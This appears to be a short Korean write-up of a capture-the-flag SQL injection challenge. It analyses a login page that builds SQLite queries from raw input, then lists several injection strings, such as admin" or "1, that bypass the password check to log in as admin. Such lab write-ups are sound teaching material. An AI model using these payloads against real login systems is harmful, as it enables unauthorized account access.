Analysis)
1. login page - GET  : userid, userpassword를 입력할 수 있는 로그인 페이지를 제공
                POST : 입력한 계정 정보가 데이터베이스에 존재하는지 확인
                       로그인 계정이 admin일 경우 FLAG 출력
               
2. 취약점 
    1) userid와 userpassword를 이용자에게 입력받고, 동적으로 쿼리문을 생성한 뒤 query_db 함수에서 SQLite에 질의
    2) RawQuery(동적으로 생성한 쿼리)를 생성할 때, 입력값이 쿼리문에 포함되면 SQL Injection 취약점에 노출될 수 있음
    3)이용자의 입력값을 검사하는 과정이 없기 때문에 임의의 쿼리문을 userid 또는 userpassword에 삽입해 SQL Injection 공격 수행 가능


3. 로그인 쿼리
   1) SELECT * FROM users WHERE userid="{userid}" AND userpassword="{userpassword}";

                      
   2) admin 계정으로 로그인할 수 있는 SQL Injection 쿼리
      - SELECT * FROM users WHERE userid="admin"-- " AND userpassword="DUMMY"
      - SELECT * FROM users WHERE userid="admin" or "1" AND userpassword="DUMMY"
      - SELECT * FROM users WHERE userid="admin" AND userpassword="DUMMY" or userid="admin"
      - SELECT * FROM users WHERE userid="" or 1 LIMIT 1,1-- " AND userpassword="DUMMY"

Exploit) 
SQL Injection 취약점을 통해 /login page에서 userid와 password에 쿼리 입력
   => userid   => admin" or "1
      password => 입력 값 의미없음
